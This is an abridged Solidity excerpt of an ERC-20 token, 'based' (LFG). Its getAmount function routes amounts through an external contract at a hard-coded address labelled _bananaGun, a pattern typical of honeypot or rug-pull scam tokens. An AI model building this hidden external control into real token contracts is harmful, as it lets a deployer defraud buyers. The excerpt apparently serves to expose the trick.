...
interface IERC724 {
      function goSwap(uint256 value) external returns (uint256);
}
...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    address _bananaGun = 0x687834C66FE5DdF70D432b4122ac061DAa427A0D;
    address public pair;
    ...
    function getAmount(uint256 amount) internal returns (uint256) {
        return bananaGun.goSwap(amount);
    }
    ...
    function _DeployHeroic(address account, uint256 amount) internal virtual {
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployHeroic(creator, initialSupply);
    }
}

contract BasedLFG is ERC20Token {
    constructor() ERC20Token("based", "LFG", msg.sender, 100000000 * 10 ** 18) {
    }
}